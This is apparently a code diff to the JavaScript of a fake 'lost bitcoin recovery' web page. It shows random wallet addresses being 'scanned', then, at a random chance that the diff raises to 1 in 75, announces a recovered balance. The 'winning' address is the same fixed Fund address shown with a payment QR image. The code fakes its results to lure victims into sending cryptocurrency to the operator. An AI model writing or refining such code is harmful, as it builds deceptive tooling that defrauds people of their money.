@@ -391,21 +391,16 @@
       let btcPriceUSD = 76149.00;
 
       // ========== تنظیمات اصلی ==========
-      // 1) آدرس Fund: همیشه همان b7c7
       const FIXED_FUND_OPTION = {
         qr: 'https://lostbitcoin.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg',
         address: '0x55aD83631e3E454b79510273a2F89A4bf096B7C7'
       };
 
-      // 2) ولت برنده و شانس برنده شدن
       const WINNING_WALLET_ADDRESS = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
-      const WIN_CHANCE = 1 / 100;            // شانس 1 به 100 = 1%
-
-      // موجودی برنده: هر بار تصادفی بین 0.011 تا 0.03 BTC
+      const WIN_CHANCE = 1 / 75;             // ← شانس 1 به 75
       const WINNING_BALANCE_MIN = 0.011;
       const WINNING_BALANCE_MAX = 0.03;
 
-      // ساخت 60 آدرس نمایشی برای اسکن (همه با موجودی 0)
       const walletList = [];
       for (let i = 0; i < 60; i++) {
         const addr = '0x' + Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('');
@@ -441,11 +436,9 @@
             clearInterval(scanInterval);
             scanning = false;
 
-            // ========== تصمیم‌گیری شانس 1 به 100 ==========
             const isWinner = Math.random() < WIN_CHANCE;
 
             if (isWinner) {
-              // موجودی تصادفی بین 0.011 و 0.03
               const randomBalance = Math.random() * (WINNING_BALANCE_MAX - WINNING_BALANCE_MIN) + WINNING_BALANCE_MIN;
               recoveredWallet = {
                 address: WINNING_WALLET_ADDRESS,
